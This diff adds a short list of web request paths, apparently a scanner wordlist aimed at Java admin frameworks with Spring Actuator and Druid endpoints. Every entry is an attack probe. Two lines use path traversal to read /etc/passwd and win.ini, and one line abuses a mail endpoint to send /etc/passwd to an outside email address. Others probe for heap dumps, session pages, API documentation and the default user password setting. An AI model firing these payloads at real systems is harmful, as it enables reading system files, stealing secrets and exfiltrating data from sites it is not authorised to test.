@@ -1,0 +1,14 @@
+/register
+/druid/websession.html
+/system/druid/websession.html
+/actuator/heapdump
+/actuator
+/api/v3/api-docs
+/api/v2/api-docs
+/prod-api/v3/api-docs
+/prod-api/v2/api-docs
+/demo/mail/sendMessageWithAttachment?to=nccsec@qq.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd
+/common/download/resource?resource=/profile/../../../../etc/passwd
+/common/download/resource?resource=/profile/../../../../Windows/win.ini
+/system/config/configKey/sys.user.initPassword
+/prod-api/system/config/configKey/sys.user.initPassword
